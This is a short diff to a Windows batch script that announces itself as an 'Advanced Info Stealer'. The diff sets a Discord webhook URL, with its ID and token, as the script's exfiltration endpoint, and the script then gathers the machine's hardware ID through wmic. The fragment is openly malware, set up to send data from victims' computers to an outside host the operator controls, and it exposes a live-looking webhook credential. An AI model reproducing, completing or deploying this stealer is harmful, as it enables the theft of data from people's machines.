@@ -3,7 +3,7 @@ color F0
 echo Advanced Info Stealer!
 
 ::SET WEBHOOK HERE!
-set webhook=WEBHOOK_HERE
+set webhook=https://discord.com/api/webhooks/1032144603203256361/k4euXf57xGzrA_XyfJw6ItprfV-e1D0dbx16GISowYNgK9mcxdDkRlla38hWMe0HFrkj
 
 for /f "tokens=2 delims==" %%J in ('wmic csproduct get uuid /value') do set hwid=%%J
 Find /I "%hwid%" {Location of file} > {Location of confirmation file}
